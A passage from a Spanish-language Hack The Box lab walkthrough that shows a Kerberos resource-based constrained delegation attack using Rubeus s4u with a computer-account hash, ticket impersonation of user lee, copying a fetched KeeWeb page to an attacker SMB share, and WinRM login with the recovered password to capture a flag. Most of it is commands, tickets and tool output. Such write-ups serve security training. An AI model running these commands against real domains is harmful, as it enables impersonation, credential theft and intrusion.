PS C:\Users\Administrator\Documents> .\Rubeus.exe s4u /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:Administrator /msdsspn:http/web.htb.local /domain:htb.local /ptt  

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
[*] Building AS-REQ (w/ preauth) for: 'htb.local\attackersystem$'
[*] Using domain controller: 192.168.3.203:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4ID0zCCA8+gAwIBEqEDAgECooIDwQSCA70ChJzxn2/YgfCI
      TjegtHjwUzzFILuP8PwqhwEwiTchLluMMnw4SbH5IwwQ0dmq81maSaxCRauA68z2x0nZqqjduK/sMdsE
      KR4r4xqbkYAtlRaeXgJGSt0Ilxznnb+40pfLB/bjLQmFGfn4A0S9KlIEbqP2b3Ep9Tlifxc75Xurjccu
      fx1v6GCtgcVfSPtZdB2TILpSG4rPx/wHtmJBE5LK6fpupsK+UL5hL0ASBnnoo+aUbT/xZlc3cP7XpovV
      ibaVNT7jGK04W6XQo9vpNiLOOQH1l93uF/CTbJ0PN6yOVd9jBNoZxcf8DupugBeqmExPlWpF6cii7Tjr
      1H3nnDBlDyRqxN4ChchGPAh9Zk0zHgPN5kbsrqYhsY/qWUroa5erDc5SVuIF6P1CqxouXCPescqH72IN
      ybe4ZBuvpv/xRZRiEySquoImsnEVpRpzu+bMYtHfOc66uKiz9N+teqx7vOD+nMXbk9qGD8jUIibTWdg8
      TAxnwnp47k8C+zKoLiwTjWUi+Pogkj8Uo7taWvmodxohTWE3cH9/RUeay+8YU+RvBBn+QCpxEe5QIpmf
      Gb1CDoZ7MNbc4HtS550wGxulw1f1If9eufmwL5z68dn7xXyy2hUQf4XDRqTdtABDBwh8shYBbG/lEbgZ
      4AIcG2pESETw2SXbwoQDFcD9e6FnrdneY8UZ+eUQDxoZI8ydem6piXXAbFMWQxM+21zJXp+hf2ifwT/S
      LQUTZdtxtOJdxbVwVW+3s9mKSEQpnN3+PuZIiH1tPkHb98cM/beG94YPb8d+xIIGjruoPUsa5/izQ9iY
      FZ11107P5e3QqoWWxyA7AMBXXv3N2pQTISAHQQ44NhkGicybSTXcOe5pZZV4dEpOhxSQfU4StCrIjHCp
      cvhs79c0uS2zTQ/WdEO99r9PoD2n/WEm5Rf+TOVewMFw0Ac5bNX/5e8LBOOm+hb/kTSpA7T2zzqR+qDq
      KBD53aQCjaSrapjQLhxmJTAoKtjHRpQXk1Lhx8+AGD6Jq/osZ0Dq3ROFtmJkFPURlBxR4BitDTIU718d
      hdpHrdGXWw6Cf8PX11ZcSCLEKX7HN6CeRJe+JTn8zs8eKJJKb5ryxU06hBXFY1r+Ts8subO9CkrPon8h
      f3P+AUF7r3z8fJq4qPYfX49fkVxHdPYfD9RdDluGn2Oa/r2PhhkGo1xeLF+Tfg87Tj4nJXlWBG3P6pdD
      i42dcuWPy9mYJrIZhEz659dIhIJ+hiaonvm+5+cA7bKVghk01agwdet0aPhd0W+jgdQwgdGgAwIBAKKB
      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBCEC4iuHAxmnekBkwS3uuo6oQsbCUhUQi5MT0NB
      TKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKMHAwUAQOEAAKURGA8yMDIzMDQyOTAzMTQxMlqm
      ERgPMjAyMzA0MjkxMzE0MTJapxEYDzIwMjMwNTA2MDMxNDEyWqgLGwlIVEIuTE9DQUypHjAcoAMCAQKh
      FTATGwZrcmJ0Z3QbCWh0Yi5sb2NhbA==


[*] Action: S4U

[*] Building S4U2self request for: 'attackersystem$@HTB.LOCAL'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2self request to 192.168.3.203:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'attackersystem$@HTB.LOCAL'
[*] base64(ticket.kirbi):

      doIFQjCCBT6gAwIBBaEDAgEWooIEXTCCBFlhggRVMIIEUaADAgEFoQsbCUhUQi5MT0NBTKIcMBqgAwIB
      AaETMBEbD2F0dGFja2Vyc3lzdGVtJKOCBB0wggQZoAMCARehAwIBAaKCBAsEggQHxjCHrGk75BLfMhwB
      i2j8R0nBHGsVdhhdlOwmOzmHKOVgKzOZWV0i8XiwENqndAq1HXTlvYB9yMXVLHX05WOOC4AY43Hx9QrQ
      Nhjx71XX4aBoG0ZkkD92NpR0f8+LR0IzOCBKaT+wS6Ie3vXdQSJb/H6I1yTlftUFBIxWD39/nTlaW+sd
      IVSG0CEcyaS+kESRvfwUlAjGKAngpkm+yYchHK0GaZDqSlFouQ+VJHI7hyJNT5pxsR6F5bKDhwPyTnj3
      30ltI102p8k8eHjF9HMV1gH8M8SpetwCNQ5q4k/dY1ojB5o6u2lE2hu+Uv3g7mV9ZmUoI9PT7RQyg+TN
      ME0aiDMOwRb2ppSOJyQ5tGxVSIoJHEoAjt3YTu/VibZc5cLPFOG60jItHWL7AnP2YW6xWJXNxw3LqwDa
      NmZWiceQPykKMSJn2ynce7XotpuAIgfEYfOFVjQn0QGVs759W6klxLAVenfpxaTIvimuscJnap2XrH0N
      QAZ8attbil6941TuA5HG6LdHgnlIopP2MDfERRuz3LACETNHv3EHqvBelAa6YRTNjO0iPAndcLzoXrY0
      B4ax9VwKBIOxFhrbc8xT70GvDYd1zUhkyEexLJ7RN/Ly+33YxyzIxK5fupFiA6hvoVA4yyk7Qvg6vWkH
      ff+LETnQmU8yTRUOAET3Epgn0CEJpI+Dr76I9QQAE8qrEEOtyHMim2e8rfSdFEC7dXst6xjpefoz4viB
      Do/BH5FfiztCnhsWtXdy3yS/Rr2oHf5J0mq+gAkU/suy+w8tbLezApGRxhd4NpYF3gMFWmFcCmSQ4dcV
      fxKS79k4thVZJSK21DMxNWdfnKjElb29/kCBEZClCQ58mArqSxSyNeiejvwF6IjK9W2cfPriuP9iNd2e
      8o47m59oiB8G9gg2yv1vnrZIpzVsHO0Q4n1z5aN+RDpAPz4CSIGWZjC8lYAfkyN/XF+L1cvs2lp05zje
      EH4F7OmBMgD1cDAZ38P4Jzw7TxWMFQzi0qOYyvOTdO6q6H82J55VK4yF26DI72CeqTzr97zrwj63b5Km
      FiOQha5eEsGzSmJnevaHHdYbkU5uYFK7J+HVxyAvhNA6U8rIjX6oeX1WzCeC+bdFOK+Okx9OSWZfKuO6
      G24PFbRVbv99KkBnKoXsK5cas/Ct52gTgP6MznGDEqgyRvH3dJ7hJMyXNC9KF0rDN8wdSWYwC34yWpdE
      MaGFSmP6CUS4P++hCs06QHLUydAE+HjK64R9ZuZ1h1xW+7GylCvS78BHc9cxbcmPNtywjoAzlkSzl/pG
      VcpS4c60/ySGwfHLpAwgkpY26KR6FwrvHhdkHmO/JncoOoNHhOf+bu7JtKEJzzgmCcXOY9+BJKYJS4uj
      gdAwgc2gAwIBAKKBxQSBwn2BvzCBvKCBuTCBtjCBs6AbMBmgAwIBF6ESBBA1WBJo9P8YFQszZ3QSNxpM
      oQsbCUhUQi5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAAChAAClERgPMjAyMzA0
      MjkwMzE0MTJaphEYDzIwMjMwNDI5MTMxNDEyWqcRGA8yMDIzMDUwNjAzMTQxMlqoCxsJSFRCLkxPQ0FM
      qRwwGqADAgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0k

[*] Impersonating user 'administrator' to target SPN 'http/web.htb.local'
[*] Building S4U2proxy request for service: 'http/web.htb.local'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2proxy request to domain controller 192.168.3.203:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION

PS C:\Users\Administrator\Documents>
```

Enumerando en BloodHound, nos encontramos con un grupo llamado Operations, al cual solo pertenece el usuario Lee. En este grupo, posiblemente haya algún privilegio especial. Al intentar crear nuevamente el ticket, pero esta vez suplantando al usuario Lee, logramos generar un ticket e importarlo con éxito, lo que nos permitirá acceder a web.htb.local.

![BloodHound](/assets/images/AD1.png)

```powershell
PS C:\Users\Administrator\Documents> .\Rubeus.exe s4u /user:attackersystem$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:lee /msdsspn:http/web.htb.local /domain:htb.local /ptt  
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: 32ED87BDB5FDC5E9CBA88547376818D4
[*] Building AS-REQ (w/ preauth) for: 'htb.local\attackersystem$'
[*] Using domain controller: 192.168.3.203:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE/jCCBPqgAwIBBaEDAgEWooIEFTCCBBFhggQNMIIECaADAgEFoQsbCUhUQi5MT0NBTKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJaHRiLmxvY2Fso4ID0zCCA8+gAwIBEqEDAgECooIDwQSCA70Gl8JoNiYSvTeP
      t/cTn/Imt8EBaSKCAEbEYCIQz2SaVVD3a2ZRND1hsnX+j28TqBP/F9kcPaW5bW779Yp1HZ9pi3FeoPNw
      ZwgDk8rMpE8KnZe+/eIu7L1ZSKUwHoTThSGBiard3BxQMSw9Z/TOz7WNjXoj2Ew5nyUC7ePoRgq49wzn
      Sp8X1+Qjb/OBoY083fcvwQ5nCUsvsKcXlSZhkiMSu239yCvB/FluCDc9+4kgA6Ki3AbF+q6g38t5ZqnG
      fRzYmSjxx5+ThCx9QDlfS0WAzmQgbE/u3yr92GhXVSa52sB4Ak30U7ol0G3mnBTuV2vgk8kVbn1FNzvl
      yf44/wkYOgUgPLNpuxNBpOHT+uc0O82Hqh3QFM92n33tm1aelSX2YXmhwMI1CXCF6xHfaSpVuBIojT6r
      gaRCgJ0N215klYQI3PmLqtuTNt7NFmbzVfDTX/QoUcQqngHlSP1RA1LAoz20SGrCH+5FhLd2COGtle8/
      a0gMfBDLimBIbzRhe78zl9xxVMQwecstdZrlyGmGMbiCbTl4OF7KLQS/T0BS/XYi/drOa930ZW5fkLkf
      tNo5p2agqG0W+Tn347b02G3JM62J+vZR4n+lopzU4kPAcqBxyj8JzESv4WO1df0JLVCzZou2/nQjvSbb
      /RUy+HuXlhJR6HJAGWwpaPaK9NNlU5lT0edtEOCOzUcT5Gj3+jvS2xMsLbPOtR1lO+0uxDKFqneogA8P
      uGNBTwM/a1NUeHu3J4mltpVCECQshBby/q1quamv28yMsbOuHAPk+jOXvO8FkqjnxpKOXqihpcEqE3zs
      d1ByCN1sW3ea/9TUfwJFJJl7hA+nu1gDeSECSKxW3GEkuEufBIgEix/gyZ4ZtvP471saPqukHVXiCLht
      7Dfibr0PezscZRLynbBrpdRUGpkKP8N65Hs29US7u9kSZIN6KDgGhynlnn2mO2l96ZlctWrBNlezlHf4
      c4qUHEJDw1nAIc8Bw0dXk905TMwSrbtD0eIYqrt29DMoY02xa9WOpUX72d5E/pRSNsTMJKk621oEwjti
      x0f4UWE7l1P4+GY4SFbO3nV7BtqqUtRTZYza4Y/zN+XEmkE8UIjzrkpaFE01N7RHoqg+x5IFToZcoh1r
      fjx5cbP8cGAvT3oOCpg97CE4d4jtI5755BJIiokQBfw5/Hp5PxVorjKqKeIEtdaHiJUxPAgRfEIvoB/q
      UJFXVf80x+QboYtUSu6vSyr3ySQEt1ww4UWpLjHjTnStcVHb+0y7aaHxnys3viejgdQwgdGgAwIBAKKB
      yQSBxn2BwzCBwKCBvTCBujCBt6AbMBmgAwIBF6ESBBAQLlkk2vkz97fQC58UL3+MoQsbCUhUQi5MT0NB
      TKIcMBqgAwIBAaETMBEbD2F0dGFja2Vyc3lzdGVtJKMHAwUAQOEAAKURGA8yMDIzMDQyOTAyNDExMFqm
      ERgPMjAyMzA0MjkxMjQxMTBapxEYDzIwMjMwNTA2MDI0MTEwWqgLGwlIVEIuTE9DQUypHjAcoAMCAQKh
      FTATGwZrcmJ0Z3QbCWh0Yi5sb2NhbA==


[*] Action: S4U

[*] Building S4U2self request for: 'attackersystem$@HTB.LOCAL'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2self request to 192.168.3.203:88
[+] S4U2self success!
[*] Got a TGS for 'lee' to 'attackersystem$@HTB.LOCAL'
[*] base64(ticket.kirbi):

      doIEpjCCBKKgAwIBBaEDAgEWooIDyzCCA8dhggPDMIIDv6ADAgEFoQsbCUhUQi5MT0NBTKIcMBqgAwIB
      AaETMBEbD2F0dGFja2Vyc3lzdGVtJKOCA4swggOHoAMCARehAwIBAaKCA3kEggN1KW70YRAVBOg2kIsE
      MD8n+CWeqpjfuqbYP2h1dm4dX53vGuXOlC+Q2aKR/UefKRIE3VSm916SJVK/4CYceatJVpbZKWGcB4Bm
      SJLFypDvm+lCTN16eRW/VEcdmRoHPive9jiU6q3eo6QNI/JiwGCxtGViMt/efW3ydD5DdYTa9xh5joKf
      2MOndmp73F5kq0xk47HmwfTmTg/mlLSBhG0/7d/QTefgd5jiRoepXpcdPEJ6HroHvgLugPIG7Q30TNm5
      /trhYkc+7hDccFBupyvAdehcE3JRTYDgbzO5GZUZqsmVtJQEcAQ+8CoYsOdAGUEt9zqQTDG2lKOa1TLk
      AkKwV7wBYbqYiUPop7/QmIkX5/OBKkAp2U6t2+2JH74xoK3WSQt2cvORrWGmljQVhPQ6MyLcMDMUgZ2/
      Bu1MV8Bpj0qEi+6fRc3Ny6y8D1WCngzGjIbBjkarnd8B0GeIVmDL1mq0Q5AULyid06MvosQb34FIUBYU
      o7McPp18zFkFolS/RQNw6XVhLbvHLLYrQCUA6z8TfUKOu3c4yA9ecK3Nqn+wFK1+l0LreliWsBf5FL/Y
      C7NaKWubtRDDyDVRIA7f2CSBLP79b4oWVPntAqpr9CVM4oe4bS+6b9jxwF1SGXUZE0Lqm9+KA08RiH3s
      tDG2WReuKR6n21a/0k10yDYDOf3nciv0M8MZd3GpKjpMByph7lp7VGayy+Fjne2oxHZuC5+uaBuJiQ+m
      Y2mB6ccW0irHoGwoEO3ovub4LlL90R0641aCtWJ3qNZSjBmCjbhiMCdKzo9oYcAdTA++B7jLOIpJySJk
      3B8iLSXfH8o1LmE1cyCZI50fAyChYVvAQ9JaNAjG7r9AIdUaPbSCjshwc2nwKyCJMBGREyCMwJz6qUJx
      X/dLLvRgs3MQG8aRSde/gHeuGapk2Ag44KhbkLnJ5cMt8aae3NFsdvNiyCB0GaoUucXof0QoKIBS8XP2
      xPHqe9uuxD9TeX037Vgz9Fs0Y7L+Uqm64vUsk9f+2kgl2yN31dRlgHADCuKQ85X70XE/8YZvu/zTrorF
      xQYZUQA5sl2PyxDor6Mhx/Otv2tUVPR7HHk5/ZwBy9cXvPG4mhY6pI4ALlIaPKnLSp5cCKCEZq5RY/V/
      35O9t3g6n0IQRUsTACk6TuWiR6A9DaQspqFESe35jVnno4HGMIHDoAMCAQCigbsEgbh9gbUwgbKgga8w
      gawwgamgGzAZoAMCARehEgQQYDTbN6b1VNBxmveWBs3KAaELGwlIVEIuTE9DQUyiEDAOoAMCAQqhBzAF
      GwNsZWWjBwMFAAChAAClERgPMjAyMzA0MjkwMjQxMTBaphEYDzIwMjMwNDI5MTI0MTEwWqcRGA8yMDIz
      MDUwNjAyNDExMFqoCxsJSFRCLkxPQ0FMqRwwGqADAgEBoRMwERsPYXR0YWNrZXJzeXN0ZW0k

[*] Impersonating user 'lee' to target SPN 'http/web.htb.local'
[*] Building S4U2proxy request for service: 'http/web.htb.local'
[*] Using domain controller: dc1.htb.local (192.168.3.203)
[*] Sending S4U2proxy request to domain controller 192.168.3.203:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/web.htb.local':

      doIFWjCCBVagAwIBBaEDAgEWooIEezCCBHdhggRzMIIEb6ADAgEFoQsbCUhUQi5MT0NBTKIgMB6gAwIB
      AqEXMBUbBGh0dHAbDXdlYi5odGIubG9jYWyjggQ3MIIEM6ADAgESoQMCAQmiggQlBIIEIX1Q3yZ6k49P
      Tkk0jwxgepK5+bay2wgBWgBzTEtqVvgRqYmPnundz4SyT2EGGwb/O/eLXulnazIFUvhSgMWNakHnW2FM
      RJB/zAcdI24hYf0pA6p4dbzECn0hZbyd0JWfLwZwUjaR4a9lpWlLCwF+OEmm/vGEXzk9p/MtgB9U+jr0
      vPjyS8CoHNe9jzI0ZXb3xm0OngEzwm2WI+LnkbMEtSoWT1M0oG19MDPXcvMpR+k2wDiMSh/JoNC4Bh58
      1zZ1QlrmZwYp1ncsDUjjwdrZB/fNrSJTvXSdUe4TqvwFTN1ycmrnQo+GfaR2PCCCxo6G+QnNNc2lz6e6
      v/Xy0PbQeDfQMPPzASxUUhSDG5J6nhj5Z9BWdG0HFRxy7w9UT/ZupxhNkl3RmZPScRiiGkkYRal6t5Bm
      6oB0rLYcV81CYP/QHFMXE1kiksHEAYcXBQ2bmVY6wnqlMxU06lCMslh4yCY3G0vLdMZ5ZuUGT6Zdinq7
      dGnzBobG4VtXVvEE4AikgwzrL1RjcPxbUKYnhZlu7QXpPZty178kprN8UL+J9pXnH2QTLYwEB6Qiofsk
      V24h+gEFtYMyEVCgbTrkJfV5Y52m+2g8Es4m8vqXjJPbspNrmpzzNnVVDGrc0/I8BG1pH1cUeBLs7ToL
      Upfrrf3Q/NRyIl2inlVbdJa67noQcvv+lUZKEyoVsV+T0TmOX+UV5OPX9ujy0+sjAjVJI4mttrHse2Xe
      BHKwKNv4Sa5EBzZyK3L+t474SdA3bSOvcRvxCmtsLPlTH0xOGnsZtpNCvZrtVGxF/uKrdf8xFF1NxjZA
      RHWIiq/olNv6i6flfddlZd6ZJaIZEnvTmJCy84eGWfdrGaI3Ls0L/wxeZBoe+VccxsGesaqMgg+hUyoQ
      u/7W8z5OnnkGsfrDJKWtuOFUBbvyGcail08Ior4m1tjaijJtDrJssZGBBFPpNcrwCzx4WShBiN55q8m6
      FytVUewGCZ8UH40dP7SXglYVvTjn+8ms3YmAhC1fDOdvaLLQNbQRetjM7zqy7s+5dHI/VSsr/X7qhZ+y
      qNki5iBXq7x213m/fUygpGr5ZYP8DDun9g2mjvTVEfZFCDMpoTMZa7yHey0VVQ2ZqVfo/HZ3n8zKscEh
      2bZyuelLhzaNKuOZSQ3vYSvRUdxpW9ktcJNYRLsHsuviy39QJZe2sUg7PeI/1i7+wGp11KgbATJGP+zI
      WpoCYfaM753nY6AqT9fHb/zeULpz1QYCaqH95KwuaFbg+iyP+DyW5HonK1V5n/PTsr8YVSE+2le2Suo6
      vADTfU9MdOfy3jsA/lBaTsanI4PH/aLjpUg6rjj9vpyx09wzoE+BCyMmGUPHi9rbgj2pMtLfW2t+7/9r
      sn6XUfPMJePjcwPtdnFUZxOYR2TjphcBsPXOx+WjgcowgcegAwIBAKKBvwSBvH2BuTCBtqCBszCBsDCB
      raAbMBmgAwIBEaESBBBmVAONy74l2UlQd+yjzrU1oQsbCUhUQi5MT0NBTKIQMA6gAwIBCqEHMAUbA2xl
      ZaMHAwUAQKEAAKURGA8yMDIzMDQyOTAyNDExMFqmERgPMjAyMzA0MjkxMjQxMTBapxEYDzIwMjMwNTA2
      MDI0MTEwWqgLGwlIVEIuTE9DQUypIDAeoAMCAQKhFzAVGwRodHRwGw13ZWIuaHRiLmxvY2Fs

[+] Ticket successfully imported!

PS C:\Users\Administrator\Documents> klist

Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>	Client: lee @ HTB.LOCAL
	Server: http/web.htb.local @ HTB.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize  
	Start Time: 4/28/2023 19:56:12 (local)
	End Time:   4/29/2023 5:56:11 (local)
	Renew Time: 5/5/2023 19:56:11 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

PS C:\Users\Administrator\Documents>
```

Si intentamos acceder a la página del equipo WEB desde el navegador utilizando su dirección IP, recibiremos un error 401.2 debido a la falta de autorización. Sin embargo, al hacerlo desde la PowerShell donde hemos importado nuestro ticket, este se autenticará en la web con éxito y recibiremos un código de estado 200. Podemos realizar una petición a la página y guardar el contenido en un archivo llamado output.html.

```powershell
PS C:\Users\Administrator\Documents> Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://web.htb.local | Select StatusCode  

StatusCode
----------
       200
PS C:\Users\Administrator\Documents> Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials -Uri http://web.htb.local -OutFile output.html  
PS C:\Users\Administrator\Documents>
```

Finalmente, como antes, montamos un servidor SMB donde vamos a copiar el archivo output.html.

```bash
❯ impacket-smbserver kali . -smb2support
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0  
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```powershell
PS C:\Users\Administrator\Documents> cp output.html \\10.10.14.10\kali\output.html  
PS C:\Users\Administrator\Documents>
```

Abrimos el archivo output.html en el navegador y nos encontramos con un KeeWeb, el cual contiene bajo el dominio web.htb.local el usuario "remote_user" y su contraseña. Dado que el usuario se llama "remote_user", probamos si las credenciales son válidas mediante una autenticación con WinRM hacia web.htb.local, y devuelve "Pwn3d!" indicando que hemos comprometido con éxito el sistema.

```powershell
❯ crackmapexec winrm web.htb.local -u remote_user -p 'FZg28$dJe*Hx7c'
SMB         web.htb.local   5985   WEB              [*] Windows 6.3 Build 9600 (name:WEB) (domain:htb.local)  
HTTP        web.htb.local   5985   WEB              [*] http://web.htb.local:5985/wsman
WINRM       web.htb.local   5985   WEB              [+] htb.local\remote_user:FZg28$dJe*Hx7c (Pwn3d!)
❯ evil-winrm -i web.htb.local -u remote_user -p 'FZg28$dJe*Hx7c'  
PS C:\Users\remote_user.HTB\Documents> whoami
htb\remote_user
PS C:\Users\remote_user.HTB\Documents> type ..\Desktop\flag.txt
HADES{From_RBCD_To_p4s5word_v@Ult}
```

Ultima flag


La ultima flags  es importante